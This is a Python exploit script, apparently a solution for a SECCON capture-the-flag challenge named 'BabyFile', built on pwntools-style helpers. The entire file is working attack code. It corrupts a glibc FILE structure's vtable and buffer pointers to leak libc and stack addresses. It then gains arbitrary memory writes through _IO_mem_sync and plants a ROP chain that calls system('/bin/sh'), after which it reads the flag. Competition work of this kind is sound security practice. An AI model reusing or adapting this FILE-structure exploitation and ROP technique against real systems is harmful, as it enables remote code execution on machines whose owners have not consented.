#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':4296}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':os.getenv('SECCON_PORT')})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so', \
                        monitor = 'libc-2.31.so')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_wfile_jumps = libc.symbols['_IO_wfile_jumps']

#==========

def attack(conn, **kwargs):
    bf = BabyFile(conn)

    bf.set_u8(File.flags,  0)
    bf.set_u8(File.vtable, 0xa0-0x18)
    bf.sync()   # _IO_new_file_seekoff
    bf.set_u8(File.vtable, 0xa0-0x48)
    bf.sync()   # _IO_new_file_overflow

    bf.set_u8(File.io_read_end,   0x70)
    bf.set_u8(File.io_write_base, 0x70)
    bf.set_u8(File.fileno, int(constants.STDOUT_FILENO))
    bf.set_u8(File.vtable, 0xa0)
    bf.sync()   # _IO_new_file_sync

    addr_libc_wfile_jumps = u64(conn.recv(8))
    libc.address = addr_libc_wfile_jumps - offset_libc_wfile_jumps
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ    = libc.symbols['environ']
    addr_libc_mem_jumps  = addr_libc_wfile_jumps + 0x180
    addr_libc_file_jumps = libc.symbols['_IO_file_jumps']
    addr_libc_str_sh     = next(libc.search(b'/bin/sh'))

    bf.set_u64(File.io_read_end,   addr_libc_environ)
    bf.set_u64(File.io_write_base, addr_libc_environ)
    bf.set_u64(File.io_write_ptr,  addr_libc_environ+8)
    bf.sync()   # _IO_new_file_sync

    addr_stack = u64(conn.recv(8)) - 0x120
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    def writemem(addr, data):
        data = data.ljust((len(data)+0xf)//0x10*0x10, b'\x00')

        bf.set_u64(File.vtable,  addr_libc_mem_jumps)
        for i, d in enumerate([(data[i:i+8], data[i+8:i+0x10]) for i in range(0,len(data), 0x10)]):
            f,s = u64(d[0]), u64(d[1])
            bf.set_u64(File.io_write_base, f)
            bf.set_u64(File.io_write_ptr,  f+s)
            bf.set_u64(File.bufloc,  addr+0x10*i)
            bf.set_u64(File.sizeloc, addr+0x10*i+8)
            bf.sync()   # _IO_mem_sync

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)
    rop.exit(0)

    writemem(addr_stack+0x18, bytes(rop))
    writemem(addr_stack, p64(rop.ret_24.address))

class BabyFile:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def exit(self):
        self.sendlineafter(b'> ', b'0')

    def sync(self):
        self.sendlineafter(b'> ', b'1')

    def set_u8(self, ofs, val):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'offset:', str(ofs).encode())
        self.sendlineafter(b'value:', str(val).encode())

    def set_u64(self, ofs, val):
        for i in range(8):
            self.set_u8(ofs+i, (val>>(8*i))&0xff)

class File:
    flags         = 0
    io_read_end   = 0x10
    io_write_base = 0x20
    io_write_ptr  = 0x28
    io_buf_base   = 0x38
    io_buf_end    = 0x40
    fileno        = 0x70
    vtable        = 0xd8

    bufloc        = 0xf0
    sizeloc       = 0xf8

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag*')
    conn.recvuntil('FLAG_HERE\n')
    print('FLAG : %s' % conn.recvuntil('\n', drop=True))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
